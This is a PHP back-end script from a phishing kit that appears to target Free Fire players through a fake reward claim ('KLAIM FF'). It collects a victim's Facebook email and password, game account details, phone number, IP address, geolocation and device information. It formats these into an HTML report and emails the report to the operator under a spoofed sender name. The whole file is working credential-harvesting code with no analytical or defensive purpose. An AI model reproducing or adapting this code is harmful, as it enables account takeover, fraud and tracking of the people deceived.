<?php
include 'email.php';
include 'config/result.php';
date_default_timezone_set('Asia/Jakarta');

$get = new RndyTech;

// GET DATA YANG DI INPUT
$user = $_POST['user'];
$pass = $_POST['pass'];
$id = $_POST['id'];
$nick = $_POST['nick'];
$hp = $_POST['hp'];
$level = $_POST['level'];
$ep = $_POST['ep'];
$tier = $_POST['tier'];
$ip = $_POST['ip'];
$ua = $_POST['ua'];
$date = date('d-m-Y : h-i-s');

// INIT INFO by RndyTech
$infoip = $get->lokasi($ip);
$infoua = $get->device($ua);
$infoip2 = $get->flagcall($ip);

// MENANGKAP DATA DARI API
$benua = $infoip['Benua'];
$negara = $infoip['Negara'];
$kodenegara = $infoip['Kode_Negara'];
$callcode = $infoip['Kode_Telepon'];
$provinsi = $infoip['Provinsi'];
$kota = $infoip['Kota'];
$lon = $infoip['Longitude'];
$lat = $infoip['Latitude'];
$tz = $infoip['Time_Zone'];
$time = $infoip['Time'];
$zw = $infoip['Zona_Waktu'];
$perdana = $infoip['Perdana'];
$query = $infoip['Query'];
$device = $infoua['Device'];
$os = $infoua['Os'];
$browser = $infoua['Browser'];
$flag = $infoip2['flag'];
$callcode = $infoip2['callcode'];
$rndytech = $infoip2['rndytech'];


$subjek = "$rndytech |  $nick($level) | Login Facebook ";
$pesan = <<<EOD
<!DOCTYPE html>
        <html>
        <head>
                <title></title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
                <style type="text/css">
                        body {
                                font-family: "Helvetica";
                                width: 90%;
                                display: block;
                                margin: auto;
                                border: 1px solid #fff;
                                background: #fff;
                        }

                        .result {
                                width: 100%;
                                height: 100%;
                                display: block;
                                margin: auto;
                                position: fixed;
                                top: 0;
                                right: 0;
                                left: 0;
                                bottom: 0;
                                z-index: 999;
                                overflow-y: scroll;
                                border-radius: 10px;
                        }

                        .tblResult {
                                width: 100%;
                                display: table;
                                margin: 0px auto;
                                border-collapse: collapse;
                                text-align: center;
                                background: #fcfcfc;
                        }
                        .tblResult th {
                                text-align: left;
                                font-size: 1em;
                                margin: auto;
                                padding: 15px 10px;
                                background: #001240;
                                border: 2px solid #001240;
                                color: #fff;
                        }

                        .tblResult td {
                                font-size: 1em;
                                margin: auto;
                                padding: 10px;
                                border: 2px solid #001240;
                                text-align: left;
                                font-weight: bold;
                                color: #000;
                                text-shadow: 0px 0px 10px #fcfcfc;

                        }

                        .tblResult th img {
                                width: 100%;
                                display: block;
                                margin: auto;
                                box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
                                border-radius: 10px;
                        }
                </style>
        </head>
        <body>
                <div class="result">
                        <table class="tblResult">

                        	
                                        <th style="text-align: center;" colspan="3"> Info Login </th>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">Email</td>
                                        <td style="text-align: center;">$user</td>
                                </tr>
                <tr>
                                        <td style="border-right: none;">Password</td>
                                        <td style="text-align: center;">$pass</td>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">ID Game</td>
                                        <td style="text-align: center;">$id</td>
                                </tr>
                <tr>
                                        <td style="border-right: none;">Nickname</td>
                                        <td style="text-align: center;">$nick</td>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">Level</td>
                                        <td style="text-align: center;">$level</td>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">Rank</td>
                                        <td style="text-align: center;">$tier</td>
                                </tr>
                <tr>
                                        <td style="border-right: none;">Elitepass</td>
                                        <td style="text-align: center;">$ep</td>
                                </tr>
                                                <tr>
                                        <td style="border-right: none;">Nomor hp</td>
                                        <td style="text-align: center;">$hp - $perdana</td>
                                </tr>
                                <tr>
                                        <th style="text-align: center;" colspan="3">Info Daerah & Device</th>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">Benua</td>
                                        <td style="text-align: center;">$benua</td>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">Negara</td>
                                        <td style="text-align: center;">$negara</td>
                                </tr>
                                                                <tr>
                                        <td style="border-right: none;">Provinsi</td>
                                        <td style="text-align: center;">$provinsi</td>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">Kota</td>
                                        <td style="text-align: center;">$kota</td>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">Latitude</td>
                                        <td style="text-align: center;">$lat</td>
                                </tr>
                                <tr>
                                        <td style="border-right: none;">Longitude</td>
                                        <td style="text-align: center;">$lon</td>
                                </tr>
                <tr>
                                        <td style="border-right: none;">Zona Waktu</td>
                                        <td style="text-align: center;">$tz</td>
                                </tr>
                <tr>
                                        <td style="border-right: none;">Device</td>
                                        <td style="text-align: center;">$device</td>
                                </tr>
                <tr>
                                        <td style="border-right: none;">OS</td>
                                        <td style="text-align: center;">$os</td>
                                </tr>
                <tr>
                                        <td style="border-right: none;">Browser</td>
                                        <td style="text-align: center;">$browser</td>
                                </tr>
                                                                <tr>
                                        <td style="border-right: none;">IP Address</td>
                                        <td style="text-align: center;">$ip</td>
                                </tr>
                                                                                                <tr>
                                        <td style="border-right: none;">Waktu masuk</td>
                                        <td style="text-align: center;">$date</td>
                                </tr>
                                <tr>
                                        <th style="text-align: center;" colspan="3">&copy; RndyTech</th>
                                </tr>
                        </table>
                </div>
        </body>
        </html>
EOD;

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From:  ★ KLAIM FF ★ <result@randiramli.my.id>' . "\r\n";
$kirim = mail($email, $subjek, $pesan, $headers);
include '.locationError.php';
?>